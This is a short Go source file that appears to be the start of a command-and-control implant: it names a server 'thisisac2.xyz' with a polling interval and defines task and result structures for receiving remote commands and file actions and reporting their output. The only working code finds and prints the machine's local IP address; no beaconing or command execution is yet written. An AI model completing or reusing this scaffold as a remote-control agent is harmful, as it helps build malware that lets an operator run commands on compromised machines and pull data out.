package main

import (
	"fmt"
	"runtime"
	"os/exec"
	"net"
	"strings"
)

const (
	ServerIP = "thisisac2.xyz"
	ServerPort = "80"
	ServerURL = "http://" + ServerIP + ":" + ServerPort
	CallbackInterval = 120
)

var (
	LocalIP = getLocalIP()
)

type Task struct {
	Action string `json:"action"`
	Command string `json:"command"`
	Filename string `json:"filename"`
	TaskID string `json:"task_id"`
}

type Result struct {
	AgentID string `json:"agent_id"`
	TaskID string `json:"task_id"`
	Result string `json:"result"`
	ReturnCode int `json:"returncode"`
}

func getLocalIP() string {
	if runtime.GOOS == "linux" {
		cmd := exec.Command("bash", "-c", "hostname -I | awk '{print $1}'")
		out, err := cmd.Output()
		if err != nil {
			return "?.?.?.?" // Fallback if command fails
		}
		return strings.TrimSpace(string(out))
	} else {
		addrs, err := net.InterfaceAddrs()
		if err != nil {
			return "?.?.?.?"
		}
		for _, address := range addrs {
			// makes sure to filter out loopback addresses
			if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
				if ipnet.IP.To4() != nil {
					return ipnet.IP.String()
				}
			}
		}
		return "?.?.?.?"
	}
}

func main(){
	fmt.Println("Local IP:", LocalIP)
}